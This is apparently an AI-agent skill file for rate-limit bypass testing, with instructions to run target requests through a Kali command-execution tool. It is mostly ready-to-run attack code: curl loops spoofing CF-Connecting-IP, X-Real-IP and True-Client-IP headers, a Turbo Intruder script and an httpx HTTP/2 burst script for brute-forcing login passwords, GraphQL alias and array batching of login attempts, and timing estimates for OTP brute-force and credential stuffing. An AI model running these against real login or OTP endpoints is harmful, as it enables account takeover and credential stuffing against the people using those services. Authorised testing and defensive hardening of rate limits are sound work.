---
name: rate-limit-bypass
description: Identify rate limiting mechanisms and bypass them — CDN-specific header behavior, race condition exploitation, GraphQL batching, and practical impact calculation
origin: AI Threat Hunting
---

# Rate Limit Bypass

## Operational Reality

Rate limiting implementation varies wildly: some track by IP (bypassed by header spoofing), some by session/token (bypassed by rotating auth), some by request signature (requires structural mutation). The first step is IDENTIFYING the limiting mechanism, not blindly trying headers. Most bug reports fail because the tester tried a list of X-Forwarded-For values without first understanding what the application actually counts.

## When to Activate

- Login, registration, or password reset endpoints with brute-force protection
- OTP/MFA verification endpoints with attempt limits
- API endpoints returning HTTP 429 or degraded responses after repeated requests
- Any endpoint where rate limiting is the primary abuse control (account lockout, CAPTCHA enforcement, API quotas)
- GraphQL APIs with query-cost or request-count limiting

## Tools

- `curl` (manual probing, header injection, HTTP/2 testing)
- Python `asyncio` + `aiohttp` / `httpx` (concurrent burst testing, HTTP/2 single-packet)
- `ffuf` (header and path fuzzing with rate limit evasion)
- Turbo Intruder (Burp extension — purpose-built for race condition exploitation)

For current-engagement target requests, execute through the Kali MCP command-execution tool.

---

## Step 1: Identify the Limiter

Before trying ANY bypass, determine what the application actually tracks. This takes 5 minutes and saves hours of blind testing.

### Test: Per-IP or Per-Token?
```bash
# Send 50 requests from same IP with different session tokens
for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "Cookie: session=token_$i" \
    -X POST https://target/api/login -d 'user=test&pass=test'
done
# If you hit 429 → limiting is per-IP (tokens don't matter)
# If all return 200 → limiting is per-token (each token gets its own counter)
```

### Test: Per-Endpoint or Global?
```bash
# Hit the rate limit on /api/login, then immediately try /api/register
# If /api/register also returns 429 → global rate limit
# If /api/register works → per-endpoint rate limit
```

### Test: What Key Includes User-Agent?
```bash
# Hit the rate limit, then change User-Agent
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "User-Agent: CustomBot/1.0" \
  -X POST https://target/api/login -d 'user=test&pass=test'
# If this resets the counter → UA is part of the rate limit key (rare but exploitable)
```

### Read Response Headers
```bash
curl -v -X POST https://target/api/login -d 'user=test&pass=test' 2>&1 | \
  grep -iE '^< (x-ratelimit|retry-after|x-rate-limit|ratelimit)'
```

**What the headers reveal:**
| Header | Meaning |
|--------|---------|
| `X-RateLimit-Limit: 100` | 100 requests per window |
| `X-RateLimit-Remaining: 0` | Counter depleted |
| `X-RateLimit-Reset: 1713100860` | Unix timestamp when counter resets (compute cooldown window) |
| `Retry-After: 60` | Cooldown is 60 seconds |
| `RateLimit-Policy: 100;w=60` | IETF draft format: 100 requests per 60-second window |

If you see `X-RateLimit-Reset`, compute the window: `reset_timestamp - current_time = window_seconds`. This tells you how often the counter resets, which is critical for timing race condition attacks.

---

## Step 2: CDN-Specific Header Bypass

Generic header lists waste time. What works depends entirely on the reverse proxy / CDN in front of the application.

### Behind Cloudflare
```bash
# Cloudflare trusts ONLY these headers from its own edge (not from the client):
# CF-Connecting-IP and True-Client-IP
# X-Forwarded-For is IGNORED by default in Cloudflare's configuration.

# BUT: if the APPLICATION reads X-Forwarded-For directly (instead of using
# Cloudflare's CF-Connecting-IP), the app may trust your spoofed value even
# though Cloudflare ignores it.

# Test CF-Connecting-IP (most likely to work if app trusts Cloudflare headers):
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "CF-Connecting-IP: 10.0.0.$((RANDOM % 254 + 1))" \
  -X POST https://target/api/login -d 'user=test&pass=test'

# Test True-Client-IP (Cloudflare Enterprise feature):
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "True-Client-IP: 10.0.0.$((RANDOM % 254 + 1))" \
  -X POST https://target/api/login -d 'user=test&pass=test'
```

### Behind AWS ALB / CloudFront
```bash
# AWS ALB trusts X-Forwarded-For BUT it APPENDS your real IP to the chain.
# The header arrives as: X-Forwarded-For: <your-spoofed>, <your-real-ip>
# Most apps read the LAST entry (your real IP) or the FIRST entry (your spoofed value).

# If the app reads the FIRST entry in the chain:
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "X-Forwarded-For: 10.0.0.$((RANDOM % 254 + 1))" \
  -X POST https://target/api/login -d 'user=test&pass=test'

# If the app correctly reads the rightmost-minus-one entry → this bypass fails.
# CloudFront behavior is identical: it appends, never replaces.
```

### Behind Nginx (Direct)
```bash
# Nginx's real_ip_module processes headers in this priority order:
# 1. X-Real-IP (if set in config via set_real_ip_from + real_ip_header)
# 2. X-Forwarded-For (rightmost untrusted entry)

# Most Nginx configs use: real_ip_header X-Real-IP;
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "X-Real-IP: 10.0.0.$((RANDOM % 254 + 1))" \
  -X POST https://target/api/login -d 'user=test&pass=test'

# If Nginx is configured with set_real_ip_from for specific upstream CIDRs,
# it only trusts X-Real-IP from those IPs. Your direct request with X-Real-IP
# will be IGNORED. No header bypass is possible in this configuration.
```

### Behind Akamai
```bash
# Akamai uses True-Client-IP (set by Akamai edge, not spoofable from outside Akamai)
# BUT: if the origin app reads True-Client-IP and Akamai is NOT in front of it
# (misconfigured routing, direct-to-origin access), the header is fully spoofable.

# Direct-to-origin test (bypass CDN via IP or Host header):
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Host: target.example" \
  -H "True-Client-IP: 10.0.0.$((RANDOM % 254 + 1))" \
  -X POST https://<origin-ip>/api/login -d 'user=test&pass=test'
```

### Confirming a Header Bypass
```bash
# After finding a header that resets the counter, confirm it is consistent:
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "X-Real-IP: 10.0.0.$((RANDOM % 254 + 1))" \
    -X POST https://target/api/login -d "user=test&pass=attempt_$i")
  echo "$i: $STATUS"
done | grep -c "200"
# If all 100 return 200 → confirmed bypass. If 429s appear after N → partial bypass (rotating the header value resets the counter each time but there may be a secondary limiter).
```

---

## Step 3: Race Condition Bypass (HTTP/2 Single-Packet Attack)

This is the MOST RELIABLE bypass for server-side rate limiting because it exploits a fundamental timing weakness: the server must read the counter, check it, and increment it — but multiple requests arriving in the same TCP packet are processed before the counter updates.

### How It Works
HTTP/2 multiplexes multiple requests over a single TCP connection. If you withhold all request frames and send them in a single TCP packet, the server's network stack delivers all requests to the application layer simultaneously. The rate limit check on request N reads the counter before request N-1's increment has been committed.

### Turbo Intruder (Burp Suite)
```python
# single-packet-attack.py — Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2)
    for i in range(100):
        engine.queue(target.req, str(i).rjust(4, '0'), gate='race')
    engine.openGate('race')  # All 100 requests sent in single packet

def handleResponse(req, interesting):
    table.add(req)
```

### Python with httpx (HTTP/2)
```python
import httpx
import asyncio

async def single_packet_burst(url, data_template, count=50):
    """
    Send N requests over HTTP/2 in a tight burst.
    httpx uses hyper for HTTP/2, which multiplexes on a single connection.
    """
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []
        for i in range(count):
            data = data_template.copy()
            data['password'] = f'attempt_{i:04d}'
            tasks.append(client.post(url, data=data))
        responses = await asyncio.gather(*tasks)
        
        success = sum(1 for r in responses if r.status_code == 200)
        limited = sum(1 for r in responses if r.status_code == 429)
        print(f"200: {success} | 429: {limited} | Other: {count - success - limited}")
        return responses

# Usage
asyncio.run(single_packet_burst(
    'https://target/api/login',
    {'username': 'admin'},
    count=50
))
# If success > rate_limit_threshold → race condition bypass confirmed
```

### Why This Beats Header Spoofing
- Header spoofing requires the app to trust a client-supplied header — many don't
- Race conditions exploit the counter implementation itself — works regardless of how the app identifies clients
- Works against Redis-backed, database-backed, and in-memory counters (the race window varies but exists in all)
- The only mitigation is atomic check-and-increment (e.g., Redis `INCR` with Lua script) — most applications use separate read and write operations

---

## Step 4: GraphQL-Specific Bypass

GraphQL APIs often rate-limit by HTTP request count, not by the number of operations within a request. This creates three distinct bypass vectors.

### Alias-Based Batching
```graphql
# Single HTTP request, 100 login attempts via aliases
# Each alias is a separate operation execution — but it is ONE HTTP request
query {
  attempt_0001: login(username: "admin", password: "password1") { token }
  attempt_0002: login(username: "admin", password: "password2") { token }
  attempt_0003: login(username: "admin", password: "password3") { token }
  # ... up to attempt_9999
}
```
If the rate limiter counts HTTP requests: 1 request = 1 count, but you executed 100 operations. Effective multiplier: 100x.

### Array Body Batching
```json
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]
```
Many GraphQL servers accept an array of operations in a single POST body. Rate limiters that count POST requests see 1 request; the server processes 3.

### Fragment-Based Query Variation (Query-Hash Bypass)
```graphql
# Some rate limiters hash the query string to dedup identical requests.
# Use fragments to change the query hash while keeping identical behavior:

# Request 1:
query { login(username: "admin", password: "pass1") { token } }

# Request 2 (different hash, same operation):
query { login(username: "admin", password: "pass1") { token ...Noop } }
fragment Noop on LoginResult { __typename }

# Request 3 (different hash again):
query { login(username: "admin", password: "pass1") { ...LoginFields } }
fragment LoginFields on LoginResult { token }
```
Each request has a different query hash, so hash-based dedup or rate limiting treats them as distinct queries.

### Detection: Is the GraphQL Endpoint Vulnerable?
```bash
# Test 1: Does the endpoint accept array batching?
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]'
# If you get an array response with 2 results → batching is supported

# Test 2: Does the endpoint accept aliased operations?
curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a:__typename b:__typename c:__typename }"}'
# If you get {"data":{"a":"Query","b":"Query","c":"Query"}} → aliases work
```

---

## Step 5: Account Input Variation

If the rate limiter keys on the raw input string (not normalized), input variations target the same account but reset the counter.

```
user@example.com          # baseline
User@example.com          # uppercase first char
user+tag@example.com      # plus addressing (RFC 5233)
user%40example.com        # URL-encoded @ (if app decodes after rate check)
user@Example.com          # domain case variation
```

**How to determine if this works:**
1. Hit the rate limit with `user@example.com`
2. Try `User@example.com` — if the request succeeds AND the server processes it as the same account (check response), the limiter keys on raw input but the application normalizes before lookup

This is more common than you'd expect: the rate limiter (often a middleware or WAF layer) and the application logic (ORM/database query) normalize differently.

---

## What Doesn't Work (and Why)

### Random X-Forwarded-For Values
**Why it usually fails:** Most reverse proxies (Nginx, HAProxy, Cloudflare, AWS ALB) APPEND your real IP to the X-Forwarded-For chain rather than replacing it. The application sees:
```
X-Forwarded-For: <your-spoofed-value>, <your-real-ip>
```
If the app reads the rightmost entry (correct behavior per RFC 7239), it gets your real IP regardless of what you inject. Only works when the app reads the leftmost entry (common misconfiguration) or when the app sits directly behind a proxy that trusts client-supplied XFF.

### Path Normalization Bypasses
**Why it usually fails:** Modern frameworks (Express, Django, Rails, Spring Boot) normalize paths before routing: `/api//login` becomes `/api/login`, `/api/./login` becomes `/api/login`. The rate limiter applied at the framework level (middleware) sees the normalized path. This only works when the rate limiter is applied at the reverse proxy level (Nginx, Apache) and the proxy does NOT normalize before the app does.

```
/api/login           → normalized by framework before rate check (no bypass)
/api/login/          → some frameworks strip trailing slash, some don't (test it)
/api//login          → normalized by most frameworks (no bypass)
/%61%70%69/login     → URL-decoded before routing in all modern frameworks (no bypass)
```

**When it DOES work:** Rate limiting at CDN/WAF level (Cloudflare Rate Limiting, AWS WAF) where the CDN applies the rate rule on the raw path and the origin normalizes differently.

### User-Agent Rotation as Sole Bypass
**Why it usually fails:** User-Agent is almost never part of the rate limit key. Rate limiters track by IP, session token, API key, or account — not UA. Testing UA variation is Step 1 reconnaissance, not a bypass technique.

### HTTP Method Switching
**Why it usually fails:** If POST `/api/login` is rate-limited, PUT and PATCH to the same endpoint almost always return 405 Method Not Allowed. The login handler only accepts POST. Method switching works only when the rate limiter is path-only (ignoring method) and the same path accepts multiple methods with different handlers.

---

## Impact Calculation

Rate limit bypass severity depends entirely on what becomes possible without the limit. Calculate concrete impact for the report.

### OTP Brute-Force
- 4-digit OTP: 10,000 combinations
- 6-digit OTP: 1,000,000 combinations
- At 100 requests/second (typical with race condition bypass): 4-digit = **100 seconds**, 6-digit = **2.8 hours**
- At 10 requests/second (header rotation): 4-digit = **17 minutes**, 6-digit = **28 hours**
- If OTP has 5-minute expiry window: need 100 req/s minimum for 4-digit, 6-digit is not feasible with expiry

### Password Brute-Force
- Top 100 passwords: 100 attempts per account
- Top 1,000 passwords: 1,000 attempts per account
- At 10 requests/second without rate limit: top 100 = **10 seconds**, top 1,000 = **100 seconds**
- Credential stuffing (breach list): 10,000 credential pairs at 100 req/s = **100 seconds** to check an entire breach dump against the target

### API Key Enumeration
- If API keys are sequential or have low entropy (e.g., 6-digit numeric): same math as OTP
- If API keys are UUIDs: not feasible (2^122 combinations) — rate limit bypass alone does not make this exploitable
- If API keys are short alphanumeric (8 chars, lowercase + digits): 36^8 = 2.8 trillion — not feasible

### Account Enumeration
- Rate limit bypass on registration or password reset → check if email/username exists
- Combined with a username list (company directory, LinkedIn scraping): enumerate valid accounts at scale
- Useful as a chain: enumerate valid accounts → credential stuff those accounts

---

## What to Record

- Endpoint and HTTP method that is rate-limited
- Limiter identification: what the rate limit keys on (IP, token, account, path, global)
- Baseline: exact request count before limiting triggers + cooldown window
- Bypass technique that succeeded (specific header, race condition, GraphQL batching, input variation)
- Requests achieved beyond the limit (number, not just "bypassed")
- Whether the bypass is repeatable (one-time race vs sustainable header rotation)
- Concrete impact calculation: what attack becomes feasible (OTP brute-force in N seconds, credential stuffing N accounts in N minutes)
- CDN/proxy identified and version if available (determines which techniques are applicable)
- Severity: Critical (auth bypass via OTP brute-force), High (login brute-force), Medium (API abuse, enumeration), Low (non-sensitive endpoint)

## Kill Signals — Stop Testing When
- Rate limiting is per-authenticated-session with no header/path bypass AND no race condition window → protection is effective, move on
- CDN-specific header bypass succeeds → record finding with impact calculation, stop testing other bypass methods
- Race condition (HTTP/2 single-packet) succeeds → record as highest-priority bypass, stop other methods
- All bypass methods fail after systematic testing → rate limiting is robust, record as "tested, no bypass found"

## Extended Resources

- `agent/references/payloads/rate-limit-bypass-payloads.md` -- IP spoofing headers, path variations, parameter pollution techniques
- `agent/references/code-vuln-patterns/injection.md` -- relevant for GraphQL injection patterns
